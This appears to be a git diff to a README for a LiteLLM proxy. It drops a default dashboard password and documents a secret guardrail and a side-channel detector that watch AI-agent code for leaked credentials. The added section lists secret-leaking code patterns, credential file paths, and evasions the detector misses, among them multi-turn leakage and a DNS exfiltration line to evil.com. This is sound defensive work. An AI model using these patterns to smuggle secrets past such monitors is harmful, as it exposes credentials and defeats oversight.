@@ -117,7 +117,7 @@ cp .env.example .env
 #   LITELLM_PORT=4000
 #   DATABASE_URL=postgresql://user:pass@host:5432/litellm
 #   UI_USERNAME=admin
-#   UI_PASSWORD=your-dashboard-password
+#   UI_PASSWORD=your-password
 #   STORE_MODEL_IN_DB=True
 ```
 
@@ -155,7 +155,7 @@ https://litellm.thnkandgrow.com/ui/
 
 Login with:
 - **Username:** `admin`
-- **Password:** set via `UI_PASSWORD` env var (default: `openclaw2026`)
+- **Password:** set via `UI_PASSWORD` env var
 
 The dashboard provides spend tracking, virtual key management, model management, and usage analytics.
 
@@ -169,6 +169,10 @@ The dashboard provides spend tracking, virtual key management, model management,
 | `.env` | Secrets (gitignored) — GITLAB_PAT, DATABASE_URL, UI_USERNAME, UI_PASSWORD, etc. |
 | `proxy.py` | Legacy wrapper (`write_config()` preserves callbacks section) |
 | `token_db.py` / `token_logger.py` | Token usage logging to SQLite; `token_logger.py` is an active callback in config |
+| `secret_guardrail.py` | Output-level secret detection: regex patterns, vault matching, entropy analysis, prompt injection blocking |
+| `side_channel_detector.py` | Pre-execution AST taint analysis: detects indirect secret leakage via side-channels (5 languages) |
+| `test_secret_guardrail.py` | Tests for secret guardrail |
+| `test_side_channel_detector.py` | Tests for side-channel detector (80 tests) |
 | `migrate_spend_logs.py` | One-time migration script: SQLite usage.db → PostgreSQL LiteLLM_SpendLogs |
 
 ## Environment variables
@@ -179,7 +183,134 @@ The dashboard provides spend tracking, virtual key management, model management,
 | `LITELLM_MASTER_KEY` | Yes | API key clients use to authenticate to the proxy |
 | `LITELLM_PORT` | No | Proxy port (default: 4000) |
 | `GITLAB_INSTANCE` | No | GitLab instance URL (default: https://gitlab.com) |
-| `DATABASE_URL` | Yes (for dashboard) | PostgreSQL connection string (e.g. `postgresql://user:pass@host:5432/litellm`) |
+| `DATABASE_URL` | Yes (for dashboard) | PostgreSQL connection string |
 | `UI_USERNAME` | No | Admin dashboard username (default: `admin`) |
 | `UI_PASSWORD` | No | Admin dashboard password |
 | `STORE_MODEL_IN_DB` | No | Store model configs in DB (default: `True`) |
+
+## Security: Secret Protection
+
+Two-layer defense against secret leakage in AI agent interactions.
+
+### Layer 1: Output Guardrail (`secret_guardrail.py`)
+
+Scans prompts and responses for secrets using:
+- **300+ regex patterns** for API keys, tokens, connection strings across all major providers
+- **Vault matching** with k-gram partial match (catches obfuscated/split secrets)
+- **Entropy-based detection** for high-entropy strings (base64, hex)
+- **Normalization pipeline** that defeats zero-width character insertion, base64/hex encoding, URL encoding
+- **Prompt injection blocking** for user messages attempting to extract secrets
+
+Behavior: REDACT accidental secrets → allow request. BLOCK extraction attempts → reject.
+
+### Layer 2: Side-Channel Detector (`side_channel_detector.py`)
+
+Pre-execution AST-based taint analysis that catches **indirect** secret leakage — the techniques that bypass output-level redaction:
+
+```python
+# These bypass Layer 1 (output looks innocent) but Layer 2 catches them:
+print(len(secret))              # MEDIUM  - leaks length
+print(secret.startswith("a"))   # HIGH    - enables binary search
+print(ord(secret[0]))           # CRITICAL - leaks byte value
+print(secret[:3])               # CRITICAL - leaks substring
+for c in secret: print(c)      # CRITICAL - leaks entire value
+```
+
+#### How it works
+
+```mermaid
+flowchart LR
+    A[Code to execute] --> B{AST Parse}
+    B --> C[Identify Taint Sources]
+    C --> D[Propagate Taint]
+    D --> E[Check Sinks]
+    E -->|CRITICAL/HIGH| F[BLOCK]
+    E -->|MEDIUM/LOW| G[WARN]
+    E -->|Clean| H[ALLOW]
+```
+
+1. **Taint Sources** — where secrets enter code:
+   - `os.environ`, `os.getenv()`, `subprocess.run()`
+   - DB queries: `cursor.fetchone()`, `.fetchall()`
+   - Sensitive file reads: `/proc/PID/environ`, `.ssh/`, `.env`
+   - Variable names matching secret patterns (`password`, `api_key`, `token`, etc.)
+
+2. **Taint Propagation** — tracks through:
+   - Assignment chains: `x = secret.split()[0]`
+   - Attribute access: `result.stdout`
+   - Method calls: `data.get("host")`
+   - Loop iteration: `for line in result.stdout.split()`
+   - List/dict/set comprehensions: `[c for c in secret]`
+
+3. **Side-Channel Sinks** — operations that leak info:
+
+| Severity | Operations |
+|---|---|
+| CRITICAL | `s[i]`, `s[:3]`, `ord(s)`, `repr(s)`, `for c in s`, comprehensions |
+| HIGH | `s.startswith()`, `s.find()`, `s == x`, `s.encode()`, `base64.b64encode(s)`, f-strings |
+| MEDIUM | `len(s)`, `s.count()`, `s.split()`, `hash(s)` |
+| LOW | `type(s)` |
+
+#### Languages supported
+
+| Language | Detection Method |
+|---|---|
+| Python | Full AST taint tracking |
+| Bash | Regex: `cut -c`, `${s:0:3}`, `${#s}`, `curl $s` |
+| JavaScript | Regex: `.charCodeAt()`, `.charAt()`, `.substring()` |
+| Ruby | Regex: `.each_byte`, `.each_char`, `.bytes[]` |
+| Go | Regex: `utf8.DecodeRune`, `fmt.Println(s[0])` |
+
+Also detects embedded Python in bash commands (`python3 -c "..."`) and scans the embedded code.
+
+#### CLI usage
+
+```bash
+# Scan a code string
+python side_channel_detector.py "print(len(os.environ['SECRET']))"
+
+# Scan a file
+python side_channel_detector.py suspicious_script.py
+```
+
+#### Programmatic usage
+
+```python
+from side_channel_detector import scan_code, SideChannelConfig, Severity
+
+# With defaults (reads env vars)
+result = scan_code(agent_code)
+if result.blocked:
+    raise SecurityError(f"Side-channel detected: {result.findings}")
+
+# With custom config
+config = SideChannelConfig(
+    mode="warn",
+    min_severity=Severity.HIGH,
+    languages={"python", "bash"},
+    extra_taint_sources={"MY_INTERNAL_SECRET"},
+)
+result = scan_code(agent_code, config=config)
+```
+
+### Environment variables (security)
+
+| Variable | Default | Description |
+|---|---|---|
+| `SIDE_CHANNEL_DETECTION_ENABLED` | `true` | Master on/off switch |
+| `SIDE_CHANNEL_MIN_SEVERITY` | `MEDIUM` | Minimum severity to report: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO` |
+| `SIDE_CHANNEL_MODE` | `block` | `block` = reject on HIGH+, `warn` = findings only, `log` = silent |
+| `SIDE_CHANNEL_LANGUAGES` | all | Comma-separated: `python,bash,js,ruby,go` |
+| `SIDE_CHANNEL_EXTRA_SOURCES` | _(empty)_ | Extra variable names to pre-taint: `MY_VAR,CUSTOM_SECRET` |
+
+### What it cannot detect
+
+The side-channel detector catches ~80% of patterns via static analysis. It cannot detect:
+
+- **Dynamic code generation**: `exec("pr" + "int(s)")`
+- **Timing side-channels**: `time.sleep(0.1 * ord(s[0]))`
+- **Exit code encoding**: `sys.exit(ord(s[0]))`
+- **Multi-turn accumulation**: one character leaked per LLM conversation turn
+- **DNS/network exfiltration**: `socket.getaddrinfo(f"{s[0]}.evil.com")`
+
+For these, you need runtime sandboxing (eBPF/seccomp) or network-level monitoring.
